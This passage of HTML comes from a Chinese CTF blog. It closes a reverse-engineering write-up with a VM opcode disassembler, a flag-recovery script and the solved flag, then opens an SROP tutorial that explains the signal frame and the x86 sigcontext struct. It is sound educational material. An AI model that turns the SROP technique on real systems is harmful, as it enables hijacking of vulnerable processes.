<span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0E</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, <span class="number">0x12</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, </span><br><span class="line">  <span class="number">0xE1</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE2</span>, <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0xF8</span>, <span class="number">0xF1</span>, <span class="number">0xE4</span>, <span class="number">0x0F</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF1</span>, <span class="number">0xE7</span>, </span><br><span class="line">  <span class="number">0x11</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xF4</span>]</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(opcode)):</span><br><span class="line">	<span class="keyword">if</span> (opcode[i] == <span class="number">0xF1</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;mov &#x27;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">		<span class="keyword">if</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE1</span>):</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;eax &#x27;</span> + <span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">		<span class="keyword">elif</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE2</span>):</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;ebx &#x27;</span> + <span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">		<span class="keyword">elif</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE3</span>):</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;ecx &#x27;</span> + <span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">		<span class="keyword">elif</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE4</span>):</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;] &#x27;</span> + <span class="string">&#x27;eax&#x27;</span>)</span><br><span class="line">		<span class="keyword">elif</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE5</span>):</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;edx &#x27;</span> + <span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">		<span class="keyword">elif</span> (opcode[i + <span class="number">1</span>] == <span class="number">0xE7</span>):</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;flag[&#x27;</span> + <span class="built_in">str</span>(opcode[i + <span class="number">2</span>]) + <span class="string">&#x27;] &#x27;</span> + <span class="string">&#x27;ebx&#x27;</span>)</span><br><span class="line">		i += <span class="number">6</span></span><br><span class="line">	<span class="keyword">elif</span> (opcode[i] == <span class="number">0xF2</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;xor eax ebx&#x27;</span>)</span><br><span class="line">		i += <span class="number">1</span></span><br><span class="line">	<span class="keyword">elif</span> (opcode[i] == <span class="number">0xF5</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">		i += <span class="number">1</span></span><br><span class="line">	<span class="keyword">elif</span> (opcode[i] == <span class="number">0xF4</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;nop&#x27;</span>)</span><br><span class="line">		i += <span class="number">1</span></span><br><span class="line">	<span class="keyword">elif</span> (opcode[i] == <span class="number">0xF7</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;mul eax edx&#x27;</span>)</span><br><span class="line">		i += <span class="number">1</span></span><br><span class="line">	<span class="keyword">elif</span> (opcode[i] == <span class="number">0xF8</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;swap eax ebx&#x27;</span>)</span><br><span class="line">		i += <span class="number">1</span></span><br><span class="line">	<span class="keyword">elif</span> (opcode[i] == <span class="number">0xF6</span>):</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;mov eax=3*eax+2*ebx+ecx&#x27;</span>)</span><br><span class="line">		i += <span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		i += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">read</span><br><span class="line">mov eax flag[0]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[32] eax</span><br><span class="line">mov eax flag[1]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[33] eax</span><br><span class="line">mov eax flag[2]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[34] eax</span><br><span class="line">mov eax flag[3]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[35] eax</span><br><span class="line">mov eax flag[4]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[36] eax</span><br><span class="line">mov eax flag[5]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[37] eax</span><br><span class="line">mov eax flag[6]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[38] eax</span><br><span class="line">mov eax flag[7]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[39] eax</span><br><span class="line">mov eax flag[8]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[40] eax</span><br><span class="line">mov eax flag[9]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[41] eax</span><br><span class="line">mov eax flag[10]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[42] eax</span><br><span class="line">mov eax flag[11]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[43] eax</span><br><span class="line">mov eax flag[12]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[44] eax</span><br><span class="line">mov eax flag[13]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[45] eax</span><br><span class="line">mov eax flag[14]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[46] eax</span><br><span class="line">mov eax flag[15]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[47] eax</span><br><span class="line">mov eax flag[16]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[48] eax</span><br><span class="line">mov eax flag[17]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[49] eax</span><br><span class="line">mov eax flag[18]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[50] eax</span><br><span class="line">mov eax flag[19]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[51] eax</span><br><span class="line">nop</span><br><span class="line">read</span><br><span class="line">mov eax flag[0]</span><br><span class="line">mov ebx flag[1]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[0] eax</span><br><span class="line">mov eax flag[1]</span><br><span class="line">mov ebx flag[2]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[1] eax</span><br><span class="line">mov eax flag[2]</span><br><span class="line">mov ebx flag[3]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[2] eax</span><br><span class="line">mov eax flag[3]</span><br><span class="line">mov ebx flag[4]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[3] eax</span><br><span class="line">mov eax flag[4]</span><br><span class="line">mov ebx flag[5]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[4] eax</span><br><span class="line">mov eax flag[5]</span><br><span class="line">mov ebx flag[6]</span><br><span class="line">xor eax ebx</span><br><span class="line">mov flag[5] eax</span><br><span class="line">mov eax flag[6]</span><br><span class="line">mov ebx flag[7]</span><br><span class="line">mov ecx flag[8]</span><br><span class="line">mov edx flag[12]</span><br><span class="line">mov eax=3*eax+2*ebx+ecx</span><br><span class="line">mul eax edx</span><br><span class="line">mov flag[6] eax</span><br><span class="line">mov eax flag[7]</span><br><span class="line">mov ebx flag[8]</span><br><span class="line">mov ecx flag[9]</span><br><span class="line">mov edx flag[12]</span><br><span class="line">mov eax=3*eax+2*ebx+ecx</span><br><span class="line">mul eax edx</span><br><span class="line">mov flag[7] eax</span><br><span class="line">mov eax flag[8]</span><br><span class="line">mov ebx flag[9]</span><br><span class="line">mov ecx flag[10]</span><br><span class="line">mov edx flag[12]</span><br><span class="line">mov eax=3*eax+2*ebx+ecx</span><br><span class="line">mul eax edx</span><br><span class="line">mov flag[8] eax</span><br><span class="line">mov eax flag[13]</span><br><span class="line">mov ebx flag[19]</span><br><span class="line">swap eax ebx</span><br><span class="line">mov flag[13] eax</span><br><span class="line">mov flag[19] ebx</span><br><span class="line">mov eax flag[14]</span><br><span class="line">mov ebx flag[18]</span><br><span class="line">swap eax ebx</span><br><span class="line">mov flag[14] eax</span><br><span class="line">mov flag[18] ebx</span><br><span class="line">mov eax flag[15]</span><br><span class="line">mov ebx flag[17]</span><br><span class="line">swap eax ebx</span><br><span class="line">mov flag[15] eax</span><br><span class="line">mov flag[17] ebx</span><br><span class="line">nop</span><br></pre></td></tr></table></figure>

<p>第一段是假的，第二段是真的，逆向的得到真的flag的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_flag</span>():</span><br><span class="line">    <span class="comment"># 1. 已知密文字节数组（来自题目.data段）</span></span><br><span class="line">    cipher = [<span class="number">0x69</span>, <span class="number">0x45</span>, <span class="number">0x2A</span>, <span class="number">0x37</span>, <span class="number">0x09</span>, <span class="number">0x17</span>, <span class="number">0xC5</span>, <span class="number">0x0B</span>,</span><br><span class="line">              <span class="number">0x5C</span>, <span class="number">0x72</span>, <span class="number">0x33</span>, <span class="number">0x76</span>, <span class="number">0x33</span>, <span class="number">0x21</span>, <span class="number">0x74</span>, <span class="number">0x31</span>,</span><br><span class="line">              <span class="number">0x5F</span>, <span class="number">0x33</span>, <span class="number">0x73</span>, <span class="number">0x72</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 步骤1：反转交换操作（还原到乘法操作后的状态M）</span></span><br><span class="line">    <span class="comment"># 交换规则：M[13]=C[19], M[19]=C[13]; M[14]=C[18], M[18]=C[14]; M[15]=C[17], M[17]=C[15]</span></span><br><span class="line">    M = cipher.copy()</span><br><span class="line">    M[<span class="number">13</span>], M[<span class="number">19</span>] = M[<span class="number">19</span>], M[<span class="number">13</span>]</span><br><span class="line">    M[<span class="number">14</span>], M[<span class="number">18</span>] = M[<span class="number">18</span>], M[<span class="number">14</span>]</span><br><span class="line">    M[<span class="number">15</span>], M[<span class="number">17</span>] = M[<span class="number">17</span>], M[<span class="number">15</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. 步骤2：求解乘法逆元，还原B[6]、B[7]、B[8]（即原始F[6]、F[7]、F[8]）</span></span><br><span class="line">    <span class="comment"># 已知条件：M[12] = 0x33 = 51（K），其模256逆元为251（提前计算得出）</span></span><br><span class="line">    K = M[<span class="number">12</span>]  <span class="comment"># 51</span></span><br><span class="line">    K_inv = <span class="number">251</span>  <span class="comment"># 51 mod 256的逆元</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算S6、S7、S8（乘法操作前的线性组合值）</span></span><br><span class="line">    S6 = (M[<span class="number">6</span>] * K_inv) % <span class="number">256</span>  <span class="comment"># M[6] = 0xC5 = 197</span></span><br><span class="line">    S7 = (M[<span class="number">7</span>] * K_inv) % <span class="number">256</span>  <span class="comment"># M[7] = 0x0B = 11</span></span><br><span class="line">    S8 = (M[<span class="number">8</span>] * K_inv) % <span class="number">256</span>  <span class="comment"># M[8] = 0x5C = 92</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 已知M[9] = 0x72 = 114，M[10] = 0x33 = 51（原始F[9]、F[10]）</span></span><br><span class="line">    F9 = M[<span class="number">9</span>]</span><br><span class="line">    F10 = M[<span class="number">10</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解B[8]（F[8]）：3*F8 + 2*F9 + F10 ≡ S8 mod 256</span></span><br><span class="line">    <span class="comment"># 推导：3*F8 = S8 - (2*F9 + F10) mod 256 → F8 = (结果 * 3逆元) mod 256</span></span><br><span class="line">    inv3 = <span class="number">171</span>  <span class="comment"># 3 mod 256的逆元</span></span><br><span class="line">    temp8 = (S8 - (<span class="number">2</span> * F9 + F10)) % <span class="number">256</span></span><br><span class="line">    F8 = (temp8 * inv3) % <span class="number">256</span>  <span class="comment"># 结果：0x5F = 95</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解B[7]（F[7]）：3*F7 + 2*F8 + F9 ≡ S7 mod 256</span></span><br><span class="line">    temp7 = (S7 - (<span class="number">2</span> * F8 + F9)) % <span class="number">256</span></span><br><span class="line">    F7 = (temp7 * inv3) % <span class="number">256</span>  <span class="comment"># 结果：0x33 = 51</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 解B[6]（F[6]）：3*F6 + 2*F7 + F8 ≡ S6 mod 256</span></span><br><span class="line">    temp6 = (S6 - (<span class="number">2</span> * F7 + F8)) % <span class="number">256</span></span><br><span class="line">    F6 = (temp6 * inv3) % <span class="number">256</span>  <span class="comment"># 结果：0x76 = 118</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 4. 步骤3：逆向XOR链，还原F[0]~F[5]</span></span><br><span class="line">    <span class="comment"># 已知：B[0]~B[5] = M[0]~M[5]（XOR后的结果），F[6]已求出</span></span><br><span class="line">    B = M[:<span class="number">6</span>]  <span class="comment"># B[0]~B[5] = [0x69, 0x45, 0x2A, 0x37, 0x09, 0x17]</span></span><br><span class="line">    F = [<span class="number">0</span>] * <span class="number">20</span>  <span class="comment"># 原始flag数组（F[0]~F[19]）</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 先填充已知的F[6]~F[19]</span></span><br><span class="line">    F[<span class="number">6</span>] = F6</span><br><span class="line">    F[<span class="number">7</span>] = F7</span><br><span class="line">    F[<span class="number">8</span>] = F8</span><br><span class="line">    F[<span class="number">9</span>] = F9</span><br><span class="line">    F[<span class="number">10</span>] = F10</span><br><span class="line">    F[<span class="number">11</span>] = M[<span class="number">11</span>]  <span class="comment"># M[11] = 0x76 = 118（未被修改）</span></span><br><span class="line">    F[<span class="number">12</span>] = K  <span class="comment"># M[12] = 51（未被修改）</span></span><br><span class="line">    F[<span class="number">13</span>] = M[<span class="number">13</span>]  <span class="comment"># 反转交换后的值（原始F[13]）</span></span><br><span class="line">    F[<span class="number">14</span>] = M[<span class="number">14</span>]  <span class="comment"># 原始F[14]</span></span><br><span class="line">    F[<span class="number">15</span>] = M[<span class="number">15</span>]  <span class="comment"># 原始F[15]</span></span><br><span class="line">    F[<span class="number">16</span>] = M[<span class="number">16</span>]  <span class="comment"># M[16] = 0x5F = 95（未被修改）</span></span><br><span class="line">    F[<span class="number">17</span>] = M[<span class="number">17</span>]  <span class="comment"># 原始F[17]</span></span><br><span class="line">    F[<span class="number">18</span>] = M[<span class="number">18</span>]  <span class="comment"># 原始F[18]</span></span><br><span class="line">    F[<span class="number">19</span>] = M[<span class="number">19</span>]  <span class="comment"># 原始F[19]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 逆向XOR链（从F[5]倒推到F[0]）</span></span><br><span class="line">    <span class="comment"># 公式：F[i] = B[i] ^ F[i+1]（因B[i] = F[i] ^ F[i+1]）</span></span><br><span class="line">    F[<span class="number">5</span>] = B[<span class="number">5</span>] ^ F[<span class="number">6</span>]  <span class="comment"># B[5] = 0x17 = 23</span></span><br><span class="line">    F[<span class="number">4</span>] = B[<span class="number">4</span>] ^ F[<span class="number">5</span>]  <span class="comment"># B[4] = 0x09 = 9</span></span><br><span class="line">    F[<span class="number">3</span>] = B[<span class="number">3</span>] ^ F[<span class="number">4</span>]  <span class="comment"># B[3] = 0x37 = 55</span></span><br><span class="line">    F[<span class="number">2</span>] = B[<span class="number">2</span>] ^ F[<span class="number">3</span>]  <span class="comment"># B[2] = 0x2A = 42</span></span><br><span class="line">    F[<span class="number">1</span>] = B[<span class="number">1</span>] ^ F[<span class="number">2</span>]  <span class="comment"># B[1] = 0x45 = 69</span></span><br><span class="line">    F[<span class="number">0</span>] = B[<span class="number">0</span>] ^ F[<span class="number">1</span>]  <span class="comment"># B[0] = 0x69 = 105</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 5. 步骤4：转换为ASCII字符串，得到原始flag</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>(byte) <span class="keyword">for</span> byte <span class="keyword">in</span> F])</span><br><span class="line">    flag_hex = <span class="string">&#x27;&#x27;</span>.join([<span class="string">f&#x27;<span class="subst">&#123;byte:02X&#125;</span>&#x27;</span> <span class="keyword">for</span> byte <span class="keyword">in</span> F])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;原始flag（ASCII）：&quot;</span>, flag)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;原始flag（十六进制）：&quot;</span>, flag_hex)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    decrypt_flag()</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Y0u_hav3_r3v3rs3_1t!</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/09/01/SROP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="linkpwn">
      <meta itemprop="description" content="linkpwn的学习经历">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="网络幻影">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2025/09/01/SROP/" class="post-title-link" itemprop="url">SROP</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2025-09-01 11:00:23" itemprop="dateCreated datePublished" datetime="2025-09-01T11:00:23+08:00">2025-09-01</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2025-09-23 21:26:20" itemprop="dateModified" datetime="2025-09-23T21:26:20+08:00">2025-09-23</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">总结</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/stack/" itemprop="url" rel="index"><span itemprop="name">stack</span></a>
                </span>
                  ，
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/PWN/%E6%80%BB%E7%BB%93/stack/SROP/" itemprop="url" rel="index"><span itemprop="name">SROP</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>SROP 是一种高级的漏洞利用技术，它通过篡改内核存储在用户空间栈上的<strong>信号上下文（Signal Context）</strong>，并主动调用一个特殊系统调用 <code>sigreturn()</code>，来让内核无条件地将这片被篡改的上下文恢复到CPU的所有寄存器中，从而实现一种“全能”的攻击效果。</p>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/">SROP - CTF Wiki</a>上解释的很清楚，这里我就从这写自己学习的过程，几乎是照搬。</p>
<h3 id="signal-机制"><a href="#signal-机制" class="headerlink" title="signal 机制"></a>signal 机制</h3><p><img src="/2025/09/01/SROP/1.png" alt="1"></p>
<ol>
<li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li>
<li>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址</strong>。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。<strong>需要注意的是，这一部分是在用户进程的地址空间的。</strong>之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</li>
</ol>
<p><img src="/2025/09/01/SROP/2.png" alt="1"></p>
<h3 id="signal-Frame"><a href="#signal-Frame" class="headerlink" title="signal Frame"></a>signal Frame</h3><p>x86</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs, __gsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs, __fsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> es, __esh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ds, __dsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> edi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ebp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ebx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> edx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ecx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eax;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> trapno;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> err;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eip;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs, __csh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esp_at_signal;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ss, __ssh;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> oldmask;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>x64</p>
